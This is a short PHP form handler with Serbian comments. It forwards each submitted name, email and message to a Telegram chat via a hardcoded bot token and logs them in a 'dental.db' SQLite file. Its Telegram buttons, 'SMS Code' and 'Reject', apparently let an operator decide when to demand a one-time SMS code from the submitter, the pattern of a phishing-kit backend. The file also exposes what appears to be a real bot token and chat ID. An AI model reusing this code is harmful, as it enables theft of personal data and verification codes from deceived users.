<?php
$telegramBotToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$chatId = '-4104959417';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'] ?? 'Nepoznato';
    $email = $_POST['email'] ?? 'Nepoznato';
    $message = $_POST['message'] ?? 'Bez poruke';
    // Generisanje jedinstvenog ID-a
    $uniqueId = uniqid();
    // Priprema teksta poruke
    $text = "ID: $uniqueId\nNova poruka od:\nIme: $name\nEmail: $email\nPoruka: $message";
    $inlineKeyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'SMS Code', 'callback_data' => 'sms'],
                ['text' => 'Reject', 'callback_data' => 'reject']
            ]
        ]
    ];
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'reply_markup' => json_encode($inlineKeyboard)
    ];
    // Slanje poruke putem Telegram API-ja
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramBotToken/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    try {
        // Konekcija na SQLite bazu podataka
        $pdo = new PDO('sqlite:dental.db'); // Prilagodite putanju do vaše baze

        // Priprema i izvršavanje SQL upita za čuvanje poruke
        $stmt = $pdo->prepare("INSERT INTO messages (unique_id, name, email, message) VALUES (?, ?, ?, ?)");
        $stmt->execute([$uniqueId, $name, $email, $message]);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'response' => $response, 'uniqueId' => $uniqueId]);

    } catch (PDOException $e) {
        // Obrada greške
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
?>
